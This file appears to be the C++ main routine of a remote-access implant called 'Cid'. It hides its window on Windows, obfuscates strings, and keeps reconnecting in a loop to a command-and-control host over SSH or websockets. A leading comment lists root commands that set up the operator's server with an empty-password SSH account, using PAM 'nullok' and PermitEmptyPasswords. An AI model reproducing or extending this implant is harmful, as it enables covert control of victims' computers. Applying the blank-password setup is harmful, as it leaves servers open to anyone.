
#include <mutex>
#include <thread>
/* Run all of this as root
Create a new user:
adduser --disabled-password anonymous

Disable his shell
usermod -s /bin/false anonymous

Make the password actually empty:
sed -i -re 's/^anonymous:[^:]+:/anonymous::/' /etc/passwd /etc/shadow

Allow blank passwords for SSH sessions in PAM: edit /etc/pam.d/sshd and replace the line that reads @include common-auth with:
auth [success=1 default=ignore] pam_unix.so nullok
auth requisite pam_deny.so
auth required pam_permit.so

Allow blank passwords for SSH sessions of anonymous in /etc/ssh/sshd_config:
PermitEmptyPasswords yes

Restart sshd:
systemctl restart ssh
*/

#include <libssh/libssh.h>

#if CID_WEBSOCKETS
#	include <websocketswrapper.h>
#endif

#include "SSHClient.h"
#include "global.h"
#include "obfuscated_strings.h"
#include "SSHServer.h"
#include "utils.h"

std::mutex mtx; // mutex for critical section
//CidSSHServer* cidSSHServer = nullptr;

#if !defined(IS_DEBUG) && defined(_WIN32)
//We need WinMain defined when using SUBSYSTEM:WINDOWS
#	pragma comment(linker, "/SUBSYSTEM:WINDOWS")
int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	int argc = __argc;
	char** argv = __argv;
#else
int main(int argc, char** argv)
{
#endif
	char C2_host[256] = {0};
	char* ssh_server_port = nullptr;
	char username[101] = {0};
#if CID_WEBSOCKETS
	unsigned int C2_port = 4443; // default port for wss server
#else
	unsigned int C2_port = 22; // default port for SSH server
#endif
	int exit_flag = 0;
	strncat(username, OBFUSCATED("anonymous"), sizeof(username) - 1);

#ifdef C2_IP // set static IP
	strncat(C2_host, OBFUSCATED(C2_IP), sizeof(C2_host) - 1);
#else
	parse_args(argc, argv, C2_host, username);
#endif // C2_IP

	ssh_init(); // libssh mandatory

	//CidSSHServer* server = new CidSSHServer();
	CidSSHClient* client = new CidSSHClient(C2_host, C2_port, username);

	// SSH server whatchdog
	//std::thread watchdog_thread(watchdog_check_self_server_connection, server, client, &exit_flag);

#if CID_WEBSOCKETS
	{ // WSWrapper scope
		char conn_string[500] = {NULL};
		snprintf(conn_string, sizeof(conn_string), OBFUSCATED("wss://%s:%d"), C2_host, C2_port);
		auto wswrapper = WebsocketsWrapper(conn_string);

		if(wswrapper.local_ip().length() > sizeof(C2_host))
			exit(-1);

		strncpy(C2_host, wswrapper.local_ip().c_str(), sizeof(C2_host));
		C2_port = wswrapper.local_port();

#endif
		while(1)
		{
			// client_threads connects to the C2
			std::thread client_thread(&CidSSHClient::run, client);

			if(client_thread.joinable())
				client_thread.join();

			mtx.lock();

			// ToDo: Control how to turn off Cid from operator instructions
			//if(server->ordered_terminate)
			//{
			//	delete server;
			//	delete client;
			//	exit_flag = 1;
			//	mtx.unlock();
			//	break; // we should finish Cid since operator ordered it
			//}

			delete client;

			client = new CidSSHClient(C2_host, C2_port, username);
			mtx.unlock();
		}

#if CID_WEBSOCKETS
	} // WSWrapper scope
#endif

	//watchdog_thread.join();

	ssh_finalize();

	return 0;
}
